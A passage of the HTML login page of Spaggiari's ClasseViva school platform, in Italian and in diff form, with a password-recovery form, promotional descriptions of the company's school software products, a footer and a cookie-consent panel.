+Inserisci qui sotto l'username che ti è stato fornito dalla scuola. (Esempi: YYXX0001.5555555 oppure G123456X)
+</p>
+</div>
+<div class="pwd-remind-username-container">
+<input id="usr-reminder-input" class="form-control" type="text" name="uid" v-model="login_fields.username_riminder" placeholder="Username" aria-label="Inserisci username per il recupero password" >
+<button type="submit" id="inviausername" v-bind:class="[lista_emails.length > 0 ? 'cerca_gray' : 'cerca_green']" class="btn btn-primary">
+<i class='fas fa-circle-notch fa-spin' v-if="invia_usr_btn_clicked"></i>
+Cerca
+</button>
+<div style="clear: both;"></div>
+</div>
+<div class="form-group usr-remind-captcha-container">
+<input name="j-captcha" class="j-captcha form-control" value="" placeholder="Codice di controllo">
+</div>
+<div style="clear: both;"></div>
+
+<div style="text-align: justify;" v-if="lista_emails.length > 0">
+<p>
+Seleziona l'indirizzo E-mail sul quale ricevere il link per il reset password:
+</p>
+<template v-for="(val, i) in lista_emails">
+<input type="radio" name="campo_email" :value="val.campo_email" v-bind:id="'radio'+i">
+<label v-bind:for="'radio'+i">{{val.email_hidden}}</label>
+<div style="clear: both;"></div>
+</template>
+
+</div>
+
+<div style="clear: both;"></div>
+<div style="text-align: justify; margin: 12px 0 8px 0;" v-if="lista_telefoni.length > 0" >
+<p>
+Seleziona il numero di telefono sul quale ricevere il codice per il reset della password:
+</p>
+<template v-for="(val, i) in lista_telefoni">
+<input type="radio" name="campo_telefono" :value="val.campo_telefono" v-bind:id="'radio_tel'+i">
+<label v-bind:for="'radio_tel'+i">{{val.telefono_hidden}}</label>
+<div style="clear: both;"></div>
+</template>
+</div>
+
+<div style="clear: both;"></div>
+
+<button type="button" id="confermausernameemail" blue class="btn btn-primary" v-if="lista_emails.length > 0" @click="confermaUsernameEmail">
+<i class='fas fa-circle-notch fa-spin' v-if="invia_btn_clicked"></i>
+Invia
+</button>
+
+<div style="clear:both;"></div>
+<div class="form-group text-justify mt-4 mb-0">
+<p class="mb-0">
+Hai bisogno di aiuto? Segui le indicazioni nel <button type="button" class="btn_like_a div_img_pwd_dimenticata" aria-label="Riproduci video guida per il cambio password" @click="showVideoPwddim">video</button>.
+</p>
+</div>
+<div style="clear:both;"></div>
+<transition name="fadeHeight">
+<div class="video_pwd_dimenticata" align="center" v-if="mostra_video_pwddim === true">
+<iframe id="iframe_pwd_dimenticata" xsrc="https://player.vimeo.com/video/659351134?autoplay=1" frameborder="0" allow="autoplay; fullscreen" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+</div>
+</transition>
+</form>
+</div>
+</div>
+</div>
+<p class="old-login">
+Sei un genitore? Scopriamo insieme le funzionalità di Classeviva: <a class="mostra_video_genitori" href="index.html#" @click="function(){ mostra_video_genitori = true; setTimeout(function(){ $('#iframe_genitori').attr('src', $('#iframe_genitori').attr('xsrc')); }, 50); }">clicca qui</a>.
+</p>
+<transition name="fadeHeight">
+<div class="video_pwd_dimenticata" align="center" v-if="mostra_video_genitori === true">
+<iframe id="iframe_genitori" xsrc="https://player.vimeo.com/video/595883004?autoplay=1" frameborder="0" allow="autoplay; fullscreen" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+</div>
+</transition>
+<div class="banner-container desktop" v-cloak v-if="banners_desktop.banners.length > 0">
+<button class="banner-btn prev" title="Precedente" @click="bannerPrev('banners_desktop')" v-if="banners_desktop.banners.length > 1">
+<span class="material-icons">arrow_back_ios</span>
+</button>
+<template v-for="(banner, i) in banners_desktop.banners">
+<a :id="banner.id" class="banner-content" :href="banner.url" target="_blank" :idx="i" style="display: none;" v-bind:style="{ 'background-image': 'url(' + banner.img + ')' }" @click="function(){ window[banners_desktop.banners[i].callback](); }"></a>
+</template>
+<button class="banner-btn next" title="Successivo" @click="bannerNext('banners_desktop')" v-if="banners_desktop.banners.length > 1">
+<span class="material-icons">arrow_forward_ios</span>
+</button>
+</div>
+<div class="banner-container mobile" v-cloak v-if="banners_mobile.banners.length > 0">
+<button class="banner-btn prev" title="Precedente" @click="bannerPrev('banners_mobile')" v-if="banners_mobile.banners.length > 1">
+<span class="material-icons">arrow_back_ios</span>
+</button>
+<template v-for="(banner, i) in banners_mobile.banners">
+<a :id="banner.id" class="banner-content" :href="banner.url" target="_blank" :idx="i" style="display: none;" v-bind:style="{ 'background-image': 'url(' + banner.img + ')' }" @click="function(){ window[banners_desktop.banners[i].callback](); }"></a>
+</template>
+<button class="banner-btn next" title="Successivo" @click="bannerNext('banners_mobile')" v-if="banners_mobile.banners.length > 1">
+<span class="material-icons">arrow_forward_ios</span>
+</button>
+</div>
+<transition name="fadeHeight">
+<div class="video_pwd_dimenticata" align="center" v-if="mostra_video_help_spid === true">
+<iframe id="iframe_help_spid" xsrc="https://player.vimeo.com/video/612550211?autoplay=1" frameborder="0" allow="autoplay; fullscreen" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+</div>
+</transition>
+<div class="main-logo-container">
+<div class="logo-container" :target="target">
+<img src="https://web.spaggiari.eu/home/img/sprite-progetti-loghi.svg" alt="Progetti">
+</div>
+<div v-cloak class="testo-container" v-if="target == 'cvv'">
+<p class="testo_payoff">Il cuore pulsante<br>della scuola del futuro</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'sdg'">
+<p class="testo_payoff">Tutti i documenti della scuola<br>disponibili, sempre e ovunque!</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'pvb'">
+<p class="testo_payoff" style="margin:0;">La porta d'accesso<br>alla tua nuova Scuola</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'oas'">
+<p class="testo_payoff" style="margin:0;color:#ccc;">La bussola della tua nuova Scuola.<br>Ogni giorno è con te!</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'sct'">
+<p class="testo_payoff" style="margin:0;">Per lo sviluppo armonico delle comunità</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'acd'">
+<p class="testo_payoff">Il cuore pulsante<br>della scuola del futuro</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'bmb'">
+<p class="testo_payoff" style="margin:0;">A crescere si comincia da... bambini</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'bbl'">
+<p class="testo_payoff" style="margin:0;">Contenuti, metodologie e strumenti per<br>cambiare il modo di apprendere in rete!</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'sps'">
+<p class="testo_payoff" style="margin:0;">Semplifica i tuoi  acquisti per la scuola</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'ngs'">
+<p class="testo_payoff">New Infoschool software<br>Cloud &amp; Revolutionary</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'etb'">
+<p class="testo_payoff">Il nuovo sistema informativo di Gruppo<br>per migliorare il lavoro di tutti!</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'inf'">
+<p class="testo_payoff">La rivista scientifica e professionale sull’educazione 0-6</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'wsc'">
+<p class="testo_payoff">La soluzione integrata per la gestione<br>della connettività a scuola</p>
+</div>
+<div v-cloak class="testo-container" v-if="target == 'gco'">
+<p class="testo_payoff">Il Serious Game della filiera logistica per la valutazione<br>delle competenze nel Laboratorio Territoriale per l’Occupabilità</p>
+</div>
+<div class="background-container">
+<img src="https://web.spaggiari.eu/img/20/onda_sdf_grigia.png">
+<!--<img src="/img/20/onda_natale_2021.png">-->
+</div>
+<div v-cloak class="testo-container" v-if="target == 'inf'">
+<p class="testo_payoff inf_cit">“Un autentico educatore non può che essere ottimista […] <br>avere fiducia negli altri e in particolare avere fiducia nel bambino”</p>
+</div>
+</div>
+<div class="progetti-container">
+<div class="progetti-box-container">
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=cvv" class="progetti_table_link box-selezione-progetto" data-target="cvv" title="Classeviva" aria-label="Classeviva">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=sdg" class="progetti_table_link box-selezione-progetto" data-target="sdg" title="Segreteria Digitale" aria-label="Segreteria Digitale">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=pvb" class="progetti_table_link box-selezione-progetto" data-target="pvb" title="Prima Visione Web" aria-label="Prima Visione Web">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=oas" class="progetti_table_link box-selezione-progetto" data-target="oas" title="Oggi a Scuola" aria-label="Oggi a Scuola">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=sct" class="progetti_table_link box-selezione-progetto" data-target="sct" title="Scuola e Territorio" aria-label="Scuola e Territorio">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=acd" class="progetti_table_link box-selezione-progetto" data-target="acd" title="School Academy" aria-label="School Academy">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=bmb" class="progetti_table_link box-selezione-progetto" data-target="bmb" title="Bambini" aria-label="Bambini">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=bbl" class="progetti_table_link box-selezione-progetto" data-target="bbl" title="Biblò Web" aria-label="Biblò Web">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=sps" class="progetti_table_link box-selezione-progetto" data-target="sps" title="Scuola Shop" aria-label="Scuola Shop">&nbsp;</a>
+<a href="https://web.spaggiari.eu/home/app/default/login.php?target=ngs" class="progetti_table_link box-selezione-progetto" data-target="ngs" title="Nuovi Gestionali" aria-label="Nuovi Gestionali">&nbsp;</a>
+</div>
+</div>
+<div class="prj-desc-container">
+
+<div class="prj-desc cvv">
+<div class="expand">
+<h1 style="color:#CC1020;line-height:0;margin:0;padding:0;font-size:4px;">CLASSEVIVA GRUPPO SPAGGIARI PARMA IL CUORE PULSANTE DELLA SCUOLA DEL FUTURO</h1>
+<h2 class="slogan">ClasseViva: il software di registro elettronico targato Spaggiari</h2>
+<p>
+<a href="https://web.spaggiari.eu/www/app/default/index.php?p=cvv&amp;s=cvv" tabindex="-1"><strong>ClasseViva</strong></a> nasce dalla lunga esperienza del Gruppo Spaggiari nel mondo della scuola. In 80 anni trascorsi al fianco delle scuole, il gruppo di Parma &egrave;
+riuscito a capirne le esigenze e a sviluppare progetti evoluti in grado di creare delle sinergie tra tutte le aree che gravitano attorno a questo mondo.
+</p>
+<p>
+La classe &egrave; il fulcro della vita scolastica, intorno ad essa ogni giorno ruotano Studenti, Docenti, Famiglie e Alte Professionalit&agrave; della Scuola, ognuno con il suo ruolo e le sue attivit&agrave; da compiere quotidianamente. Con ClasseViva, il software
+di registro elettronico, ogni fase dell&rsquo;attivit&agrave; scolastica (assenze, ritardi, uscite anticipate), cos&igrave; come la fase di comunicazione scuola-famiglia e la riorganizzazione innovativa della didattica, &egrave; gestita in modo innovativo ed efficiente
+utilizzando al meglio le tecnologie.
+</p>
+</div>
+</div>
+
+
+<div class="prj-desc sdg">
+<div class="expand">
+<h2 class="slogan">Segreteria Digitale: la soluzione per l&rsquo;amministrazione scolastica</h2>
+<p>L&rsquo;innovazione &egrave; sempre protagonista con le soluzioni web Spaggiari. Cos&igrave; &egrave; anche con il progetto <a href="https://web.spaggiari.eu/www/app/default/index.php?p=sdg&amp;s=sdg" tabindex="-1"><strong>Segreteria Digitale</strong></a>, il servizio innovativo che ha come scopo quello di soddisfare tramite un unico prodotto tutte le esigenze del Dirigente e del Direttore dei Servizi Generali ed Amministrativi e di chi ha la necessit&agrave; di gestire i documenti della scuola, con un'interfaccia semplice e intuitiva.&nbsp;</p>
+<p>Progetto</p>
+<p>Dematerializzazione, Conservazione e Consulenza. Sono queste le tre caratteristiche di Segreteria Digitale; con la dematerializzazione della classica segreteria viene semplificata la gestione della pubblicazione obbligatoria sui siti internet dei documenti e delle attivit&agrave; della scuola stessa.&nbsp;</p>
+<p>Attraverso la conservazione i documenti cartacei sono sostituiti e trasformati in formato digitale, che per legge &egrave; il formato con cui la scuola &egrave; tenuta a conservare i propri documenti, &ldquo;bloccandoli&rdquo; nella forma e nel tempo attraverso la firma digitale e la marcatura temporale.</p>
+<p>Infine, grazie alla consulenza offerta con il progetto Segreteria Digitale, il Gruppo Spaggiari offre consulenza legale e tecnica nella fase di utilizzo quotidiano, con una manutenzione &ldquo;evolutiva&rdquo; che consente di avere la garanzia di crescita del sistema nel tempo.&nbsp;</p>
+</div>
+</div>
+
+
+<div class="prj-desc pvb">
+<div class="expand">
+<h2 class="slogan">Prima visione Web: il sito web della tua scuola </h2>
+<p><a href="https://web.spaggiari.eu/www/app/default/index.php?p=pvb&amp;s=pvb" tabindex="-1"><strong>Prima visione Web</strong></a>&nbsp;&egrave; uno strumento che Spaggiari ha ideato per dotare gli istituti scolastici di un proprio sito internet. Avere un sito innovativo, pulito graficamente e semplice da utilizzare, chiaro nella struttura e nell&rsquo;organizzazione dei contenuti e dei servizi, &egrave; infatti uno strumento indispensabile al giorno d&rsquo;oggi perch&eacute; presenta la scuola al mondo del web, informando gli utenti, aggregando i docenti, i genitori e gli alunni, proponendo iniziative e attraendo risorse. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p>Il progetto fornisce una consulenza completa che prevede un confronto grafico-redazionale, un servizio di gestione dei contenuti, l&rsquo;inquadramento dell&rsquo;attivit&agrave; normativa obbligatoria per la scuola, il supporto tecnico per la registrazione del dominio e la consulenza per la ricerca di partner (fundraising).&nbsp;</p>
+<p>Spaggiari ha progettato Prima Visione Web con un CMS (Content Management System) immediato, intuitivo e progettato appositamente per soddisfare le esigenze di tutti i soggetti della scuola preposti all'aggiornamento del sito e prevedendo, inoltre, la perfetta sincronizzazione con gli altri strumenti web Spaggiari come: ClasseViva, Segreteria Digitale e con i principali progetti della Scuola del futuro, il tutto all&rsquo;insegna dell&rsquo;ottimizzazione di tempi e risorse.&nbsp;</p>
+<p>Il progetto fornisce una consulenza completa che prevede un confronto grafico-redazionale, un servizio di gestione dei contenuti, l&rsquo;inquadramento dell&rsquo;attivit&agrave; normativa obbligatoria per la scuola, il supporto tecnico per la registrazione del dominio e la consulenza per la ricerca di partner (fundraising).&nbsp;</p>
+</div>
+</div>
+
+
+<div class="prj-desc sct">
+<div class="expand">
+<h2 class="slogan">Scuola e Territorio: scuola e aziende per l&rsquo;accesso al mondo del lavoro</h2>
+<p><a href="https://web.spaggiari.eu/www/app/default/index.php?p=sct&amp;s=sct" tabindex="-1"><strong>Scuola e Territorio</strong></a>&nbsp;&egrave; un progetto Spaggiari volto a promuovere l&rsquo;integrazione della scuola con il territorio e in particolare con il mondo del lavoro. Lo scopo di questo progetto &egrave; rendere la scuola il motore pulsante nel processo d&rsquo;inserimento degli studenti nel mondo del lavoro con la collaborazione di enti formativi e imprese.</p>
+<p>I centri aziendali di formazione professionale, le scuole secondarie di secondo grado, gli IFTS e ITS (Istruzione e Formazione Tecnica Superiore, Istituti Tecnici Superiori), le Universit&agrave; e i dottorati di ricerca, sono tutti i destinatari di questo progetto del Gruppo Spaggiari Parma, che utilizzando tecnologie come un web server dedicato possono accedere in un&rsquo;unica piattaforma e interagire e cooperare.&nbsp;</p>
+<p>Con Scuola e Territorio &egrave; possibile attivare progettare e gestire il curriculum integrato dell&rsquo;alunno; progettare percorsi formativi personalizzati; curare la progettazione didattica delle attivit&agrave; di alternanza scuola lavoro prevista dalla normativa didattica; programmare, realizzare attivit&agrave; in materia di salute e sicurezza degli studenti; promuovere sia la formazione e-learning sia i mooc (Massive Open Online Course); sostenere il curricolo scolastico; monitorare e valutare l&rsquo;azione formativa; certificare le competenze acquisite e capitalizzare le esperienze fatte; ricercare e promuovere esperienze specifiche e tanto altro.</p>
+</div>
+</div>
+
+
+<div class="prj-desc acd">
+<div class="expand">
+<h2 class="slogan">School Academy: il sistema integrato di consulenza e formazione per Dirigenti e Docenti</h2>
+<p>Grazie a <a href="https://web.spaggiari.eu/www/app/default/index.php?p=acd&amp;s=acd" tabindex="-1"><strong>School Academy</strong></a>&nbsp;le istituzioni scolastiche possono investire in innovazione e formazione attraverso strumenti e contenuti dedicati. Il gruppo Spaggiari con questo progetto fornisce a dirigenti e docenti la possibilit&agrave; di fare rete e in questo modo confrontarsi sulle tematiche del mondo scuola facendo network.</p>
+<p>Il progetto School Academy fornisce supporto per la gestione del personale e per affrontare i casi di contenzioso, preparazione sugli adempimenti sulla sicurezza, monitoraggio della gestione amministrativo-contabile, grazie a un sistema web integrato in grado di affiancare il personale scolastico attraver confronti pluridisciplinari, piani di formazione ed eventi dedicati. </p>
+</div>
+</div>
+
+
+<div class="prj-desc oas">
+<div class="expand">
+<h2 class="slogan">Oggi a scuola: dal cartaceo al digitale con Spaggiari </h2>
+<p><a href="https://web.spaggiari.eu/www/app/default/index.php?p=oas&amp;s=oas" tabindex="-1"><strong>Oggi a Scuola</strong></a>
+grazie alla realizzazione di un sistema integrato di siti web, App e agende cartacee che accompagnano tutti gli attori della scuola (alunni, genitori e docenti) ha come obiettivo il passaggio graduale dalla carta al digitale.&nbsp; </p>
+<p>Spaggiari utilizzando tecniche come Qr-code e App consente di integrare strumenti cartacei come diari, agende per docenti, libretti scolastici, DS e DSGA con il mondo digitale dando in questo modo la possibilit&agrave; di avere sempre a portata di mano la propria scuola su tutti i tipi di device come: computer, tablet e smartphone.</p>
+</div>
+</div>
+
+
+<div class="prj-desc bmb">
+<div class="expand">
+<h2 class="slogan">Bambini:  il progetto del Gruppo Spaggiari dedicato alla fascia di et&agrave; 0-6 anni</h2>
+<p> <a href="https://web.spaggiari.eu/www/app/default/index.php?p=bmb&amp;s=bmb" tabindex="-1"><strong>Bambini</strong></a>&nbsp; &egrave; dedicato a una fascia di et&agrave; fondamentale della scuola italiana. Tra 0 e 6 anni i bambini cominciano infatti il loro percorso nei servizi educativi del territorio: negli oltre 9.000 nidi, di cui circa 4.000 a titolarit&agrave; pubblica e oltre 5.000 a titolarit&agrave; privata, e nelle oltre 24.000 scuole, di cui poco meno di 16.000 pubbliche e le restanti 8.000 private.&nbsp;</p>
+<p>Con questo progetto il Gruppo Spaggiari Parma offre contenuti come documenti, letture, approfondimenti, social e video, inquadrando il &#8220;soggetto bambino&#8221; nella sintesi del pensiero di pedagogisti nazionali e internazionali, secondo le esigenze di aggiornamento e supporto per educatrici, insegnanti, studenti e famiglie.</p>
+<p>Gruppo Spaggiari Parma con l&#8217;esperienza pi&ugrave; che trentennale di Bambini, mensile creato da Loris Malaguzzi e diventato punto di riferimento per i servizi rivolti alla fascia 0-6, coinvolge tutti gli attori del mondo dell&#8217;infanzia, permettendo di condividere esperienze e conoscenze, diffondendo buone pratiche e offrendo importanti opportunit&agrave; di crescita e aggiornamento.</p>
+</div>
+</div>
+
+
+<div class="prj-desc bbl">
+<div class="expand">
+<h2 class="slogan">Biblò la piattaforma di contenuti digitali e innovativi per la scuola del futuro</h2>
+<p><a href="https://web.spaggiari.eu/www/app/default/index.php?p=bbl&amp;s=bbl" tabindex="-1"><strong>Bibl&ograve;web</strong></a>&nbsp;&egrave; il progetto Spaggiari che mette a disposizione delle scuole contenuti, metodologie e strumenti per favorire l&rsquo;apprendimento. Per perseguire questo scopo ha creato una piattaforma di contenuti digitali e innovativi per la scuola del futuro, in grado di censire, recensire, produrre e distribuire contenuti digitali per la didattica 2.0. Un sistema all'avanguardia che crea possibilit&agrave; di interazione per l'apprendimento in rete. &nbsp;</p>
+<p>Attraverso azioni come l&rsquo;individuazione delle migliori risorse a disposizione per la didattica del futuro, la recensione sociale delle varie comunit&agrave; scolastiche, la distribuzione degli accessi a comunit&agrave; di studenti e il supporto a una didattica innovativa e a una modalit&agrave; di studio collaborativo e sociale Bibl&ograve;Web fornisce supporti didattici innovativi tramite versioni tagliate su misura e targhettizzate per fascia di et&agrave; e tipologia di scuola.
+Con Bibl&ograve;, le scuole entrano a far parte di una community e possono inserire contenuti come libri, fascicoli, TED e documenti direttamente sulla piattaforma, condividendo in questo modo le proprie esperienze. Con la creazione di una rete di scuole di eccellenza si genera una condivisione in grado di creare una formazione continua, integrata, multimediale e mista per gestire al meglio tutte le tematiche di informazione, formazione e addestramento sulle novit&agrave; normative, sui cambiamenti organizzativi e sulle nuove forme di didattica. </p>
+</div>
+</div>
+
+
+<div class="prj-desc sps">
+<div class="expand">
+<h2 class="slogan">Oltre 20.000 prodotti da scegliere attraverso 8 cataloghi Spaggiari</h2>
+<p>Il gruppo Spaggiari, all&rsquo;interno dei suoi cataloghi contiene oltre 20.000 referenze tra idee, contenuti, prodotti e servizi creati e selezionati per il mondo della scuola. I cataloghi Spaggiari, rientranti nel progetto <a href="http://shop.spaggiari.eu/" tabindex="-1"><strong>Spaggiari.Shop</strong></a>, &nbsp;sono otto e divisi a seconda del tipo di scuola o del tipo di servizio da fornire.</p>
+<p>Il gruppo Spaggiari Parma ha previsto cataloghi di prodotti/servizi per gli esami (delle scuole superiori e del primo ciclo), per registri e tecnologie, per ufficio e didattica, un catalogo specifico per la sicurezza, un catalogo di libri per gli educatori e un catalogo dedicato alla fase di scrutinio dei docenti. Navigando all&rsquo;interno dei cataloghi disponibili e collegandosi alla piattaforma <a href="http://shop.spaggiari.eu/">Spaggiari.shop</a>, famiglie, studenti e docenti, tramite un accesso personalizzato potranno procedere ai loro acquisti in totale sicurezza e comodit&agrave; </p>
+</div>
+</div>
+
+
+<div class="prj-desc wsc">
+<div class="expand">
+<h2 class="slogan"> Spaggiari, dal registro elettronico alla connettivit&agrave; Internet per le scuole</h2>
+<p>La gestione della banda di connessione ad internet nella realt&agrave; scolastica &egrave; sempre pi&ugrave; complessa e articolata: il numero dei dispositivi collegati, l&rsquo;utilizzo della banda, la distribuzione degli accessi, le differenti necessit&agrave; di banda rendono la gestione della connettivit&agrave; un compito delicato.&nbsp;WIFI Smart Connection &egrave; ua soluzione integrata per la gestione della connettivit&agrave; a scuola, in grado di rispondere alle esigenze sempre crescenti delle comunit&agrave; scolastiche.</p>
+<p>In un unico strumento:</p>
+<ul>
+<li>Aggregazione di banda disponibile</li>
+<li>Bilanciamento del carico</li>
+<li>Password di accesso personali</li>
+<li>Semplificazione degli accessi</li>
+<li>Bilanciamento banda con gestione delle priorit&agrave;</li>
+<li>Controllo navigazione sicura</li>
+<li>Blocco/accesso sincronizzato con ClasseViva</li>
+<li>Rendicontazione delle attivit&agrave;</li>
+</ul>
+</div>
+</div>
+
+<div class="prj-desc ngs">
+<div class="expand">
+<h2 class="slogan">ISoft: i nuovi rivoluzionari gestionali cloud</h2>
+<p>ISoft nasce dalla lunga esperienza di Infoschool nel settore dei gestionali scolastici iniziata oltre 30 anni fa.</p>
+<p>I software sono stati completamente riprogettati in funzione delle possibilit&agrave;  offerte dalle nuove tecnologie cloud e sono totalmente integrate con tutto l'ecosistema della Scuola del Futuro oggi.</p>
+<p>La estrema semplicit&agrave;  d'utilizzo e la copertura approfondita di ogni esigenza della scuola costituiscono la base per questa grande rivoluzione nei sistemi gestionali scolastici.</p>
+<p>Sono presenti i seguenti moduli:</p>
+<ul>
+<li>Personale 2.0 - Gestione del personale</li>
+<li>Vega Real Time - Rilevazione presenze</li>
+<li>Bilancio 2.0 - Programma annuale e bilancio</li>
+<li>Gestione approvvigionamenti</li>
+</ul>
+<p>Sono in fase di rilascio nelle prossime settimane molti altri moduli applicativi...</p>
+</div>
+</div>
+
+
+</div>
+</main>
+<footer>
+<div class="footer-container">
+<div class="row justify-content-center align-items-center">
+<!-- logo -->
+<div class="footer-logo">
+<img src="https://web.spaggiari.eu/home/img/h-logo-neg-bn.svg" class="w-100">
+</div>
+<!-- logo -->
+<!-- contattaci -->
+<div class="box-container">
+<div class="footer-contattaci" tabindex="0" aria-label="Contattaci al numero +39 0521 2992">
+<p>Contattaci</p>
+<p>+39 0521 2992</p>
+</div>
+</div>
+<!-- contattaci -->
+<!-- teamviewer -->
+<div class="box-container a-teamviewer">
+<a href="https://web.spaggiari.eu/img/supremo.exe" aria-label="Scarica software di assistenza SupRemo">
+<div class="footer-teamviewer">
+<p>Download</p>
+<img src="https://web.spaggiari.eu/img/logo_assistenza_supremo.png?v=2">
+</div>
+</a>
+</div>
+<!-- teamviewer -->
+</div>
+<!-- social -->
+<div class="row footer-social">
+<!-- logo -->
+<div>
+<!-- linkedin -->
+<span>
+<a href="https://www.linkedin.com/company/gruppo-spaggiari-parma/mycompany/" target="_blank" title="Vai al profilo LinkedIn" aria-label="Vai al profilo LinkedIn">
+<i class="fab fa-linkedin"></i>
+</a>
+</span>
+<!-- linkedin -->
+<!-- instagram -->
+<span>
+<a href="https://www.instagram.com/classevivaofficial/?hl=it" target="_blank" title="Vai al profilo LinkedIn" aria-label="Vai al profilo Instagram">
+<i class="fab fa-instagram"></i>
+</a>
+</span>
+<!-- instagram -->
+<!-- facebook -->
+<span>
+<a href="https://www.facebook.com/GruppoSpaggiariParma/" target="_blank" title="Vai al profilo LinkedIn" aria-label="Vai al profilo FaceBook">
+<i class="fab fa-facebook-square"></i>
+</a>
+</span>
+<!-- facebook -->
+<!-- youtube -->
+<span>
+<a href="https://www.youtube.com/channel/UCF0s31-MDNpE0_mN_3gpjdA" target="_blank" title="Vai al profilo LinkedIn" aria-label="Vai al profilo YouTube">
+<i class="fab fa-youtube"></i>
+</a>
+</span>
+<!-- youtube -->
+</div>
+<!-- contattaci -->
+</div>
+<!-- social -->
+<div class="footer-policy">
+<p>
+Engineered &amp; Powered by Gruppo Spaggiari Parma S.p.A - P.IVA 00150470342
+</p>
+<p>
+<a href="https://web.spaggiari.eu/CUSTOM/policy/web/privacy.html?20221114-01" target="_blank">Informativa privacy</a> - <a href="https://web.spaggiari.eu/CUSTOM/policy/web/cookies.html?20221114-01" target="_blank">Policy sui cookie</a>
+</p>
+</div>
+</div>
+</footer>
+<div id="cookieInfo" v-if="cookieInfoaccepted === false">
+<div v-show="!cookie_personalizza">
+<p class="cookie_desc">
+Questo sito o gli strumenti terzi da questo utilizzati si avvalgono di cookie necessari al funzionamento ed utili alle finalità illustrate nella
+<a href="https://web.spaggiari.eu/CUSTOM/policy/web/cookies.html?20221114-01" target="_blank" style="color: #fff;text-decoration:underline;">COOKIE POLICY</a>.
+</p>
+<div class="buttons_div">
+<button type="button" id="cookieRefuse" @click="cookieAccept(3)">RIFIUTA TUTTI</button>
+<button type="button" id="cookiePersonalize" @click="cookie_personalizza = true;">PERSONALIZZA</button>
+<button type="button" id="cookieConfirm" @click="cookieAccept(7)">ACCETTA TUTTI</button>
+<!--<button id="close_cookie_info" type="button" class="close" aria-label="Chiudi" @click="cookieClose()">
+<span aria-hidden="true">×</span>
+</button>-->
+</div>
+</div>
+<div class="personalizza_div" v-cloak v-show="cookie_personalizza">
+<p>In questa schermata è possibile consentire o negare l’accesso ai servizi di tracciamento “cookie” presenti
+sul sito web visitato. Le preferenze espresse si applicheranno a tutti i domini web “.spaggiari.eu”
+gestiti da Gruppo Spaggiari Parma S.p.A.</p>
+<p>Si rende noto che alcuni trattamenti dei dati personali possono non richiedere il consenso dell’utente in
+quanto necessari per il funzionamento della soluzione web fruita (c.d. “tecnici”).</p>
+<p>È possibile modificare le proprie preferenze in qualsiasi momento ritornando su questo sito web o
+consultando la <a href="https://web.spaggiari.eu/CUSTOM/policy/web/cookies.html?20221114-01" target="_blank" style="color: #fff;text-decoration:underline;">COOKIE POLICY</a> estesa per conoscere tipologie e tempi di conservazione degli strumenti
+di tracciamento utilizzati.</p>
+<ul>
+<li>
+<div>
+<label>Strumenti di tracciamento TECNICI</label>
+<div>
+<div class="onoffswitch" style="margin-left: 10px;">
+<input type="checkbox" name="onoffswitch1" class="onoffswitch-checkbox" v-model="cookie_flag_1" disabled="disabled">
+<label class="onoffswitch-label" @click="alert('Non è possibile disattivare l\'accettazione dei cookie tecnici, sono necessari al fine del corretto funzionamento del sito.')"></label>
+</div>
+</div>
+</div>
+<p>Servizi utilizzati per facilitare la navigazione dell’utente (cfr. art. 122, comma 1 del D.Lgs. 196/2003 e s.m.i.), ad esempio: ID univoci e dati del dispositivo informatico utilizzato.</p>
+</li>
+<li>
+<div>
+<label>Strumenti di tracciamento ANALITICI ANONIMIZZATI</label>
+<div>
+<div class="onoffswitch" style="margin-left: 10px;">
+<input type="checkbox" name="onoffswitch2" class="onoffswitch-checkbox" v-model="cookie_flag_2" disabled="disabled">
+<label class="onoffswitch-label" @click="alert('Non è possibile disattivare l\'accettazione dei cookie analitici anonimizzati, sono necessari al fine del corretto funzionamento del sito.')"></label>
+</div>
+</div>
+</div>
+<p>Impiegati per valutare l’efficacia di un servizio fornito o per contribuire a misurarne il “traffico” (scopi
+statistici) assicurando il ricorso a misure di minimizzazione del dato ed alla produzione di statistiche
+aggregate.</p>
+</li>
+<li>
+<div>
+<label>Strumenti di tracciamento ANALITICI NON ANONIMIZZATI</label>
+<div>
+<div class="onoffswitch" style="margin-left: 10px;">
+<input type="checkbox" name="onoffswitch1" class="onoffswitch-checkbox" v-model="cookie_flag_3">
+<label class="onoffswitch-label" @click="cookie_flag_3 = !cookie_flag_3" tabindex="0" tab_item_for="this" :aria-label="cookie_flag_3 ? 'Utilizzo cookies analitici non anonimizzati, acconsentito' : 'Utilizzo cookies analitici non anonimizzati, non acconsentito'"></label>
+</div>
+</div>
+</div>
+<p>Utilizzati per determinare l’efficienza di una soluzione erogata o per contribuire a calcolare il numero
+di visitatori, anche eventualmente ripartiti per area geografica, fascia oraria della connessione o altre
+caratteristiche.</p>
+</li>
+</ul>
+<div class="buttons_div">
+<button type="button" id="cookieRefuse" @click="cookieAccept(3)">RIFIUTA TUTTI</button>
+<button type="button" id="cookieConfirmAll" @click="cookieAccept(7)">ACCETTA TUTTI</button>
+<button type="button" id="cookieConfirm" @click="cookieAccept()">ACCETTA</button>
